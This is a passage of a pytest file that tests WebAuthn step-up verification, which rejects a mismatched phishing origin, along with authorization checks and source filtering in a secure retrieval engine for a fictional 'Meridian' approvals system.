            snapshot_etag="e1",
        )
    with pytest.raises(PermissionError):
        verify_webauthn_stepup_assertion(
            valid_a,
            public_key_pem=pk.public_pem,
            expected_rp_id="approvals.meridian.fin",
            expected_origin="https://phishing.evil",
            workflow_id="wf-1",
            payload_hash="h1",
            snapshot_etag="e1",
        )

    # Exercise SecureRAGEngine constant_floor_ms timing pad + RAR rag_corpus source filtering
    from aegis_core.models import (
        DelegatedTokenClaims,
        DocumentChunk,
        ReBACTuple,
        RetrievalQuery,
    )
    from secure_rag_engine.engine import RetrievalAuthorizationError, SecureRAGEngine

    class _MemStore:
        def ingest_chunks(self, chunks: list[DocumentChunk], rebac_tuples: list[ReBACTuple]) -> int:
            _ = (chunks, rebac_tuples)
            return 0

        def retrieve_authorized(
            self, claims: DelegatedTokenClaims, query: str, top_k: int
        ) -> tuple[list[ScoredChunk], str, bool]:
            _ = (claims, query, top_k)
            return (
                [
                    ScoredChunk(
                        chunk_id="chk-kb",
                        document_id="d1",
                        title="KB",
                        source_uri="u1",
                        source_system="policy_kb",
                        page_or_record_ref="p1",
                        classification=DocumentClassification.INTERNAL,
                        content="Policy KB rule",
                        dense_score=0.8,
                        lexical_score=0.5,
                        rrf_score=0.03,
                    ),
                    ScoredChunk(
                        chunk_id="chk-ma",
                        document_id="d2",
                        title="MA",
                        source_uri="u2",
                        source_system="sharepoint_ma",
                        page_or_record_ref="p1",
                        classification=DocumentClassification.INTERNAL,
                        content="MA rule",
                        dense_score=0.9,
                        lexical_score=0.6,
                        rrf_score=0.032,
                    ),
                ],
                "aegis_app_runtime",
                True,
            )

    idp2 = MeridianIdentityProvider()
    brk2 = SSODelegationBroker(
        idp=idp2,
        agent_registry=MeridianAgentRegistry(),
        revocation_store=InMemoryRevocationStore(),
        audit_ledger=InMemoryAuditLedger(),
    )
    rag_padded = SecureRAGEngine(
        broker=brk2,
        store=_MemStore(),
        audit_ledger=InMemoryAuditLedger(),
        constant_floor_ms=3.0,
    )
    with pytest.raises(RetrievalAuthorizationError):
        rag_padded.retrieve(bearer_token="bad-jwt", request=RetrievalQuery(query="policy"))
    rar_tok = brk2.exchange_token(
        TokenExchangeRequest(
            subject_token=idp2.issue_oidc_token_for_persona("elena.vance"),
            subject_token_type="urn:ietf:params:oauth:token-type:access_token",
            agent_id="meridian-ma-copilot",
            requested_scopes=["rag:read"],
            authorization_details=[
                AuthorizationDetail(type="rag_corpus", allowed_sources=("policy_kb",))
            ],
        )
    ).access_token
    filtered = rag_padded.retrieve(
        bearer_token=rar_tok,
        request=RetrievalQuery(query="Policy rule", enable_reranker=False),
    )
    assert [c.chunk_id for c in filtered.results] == ["chk-kb"]
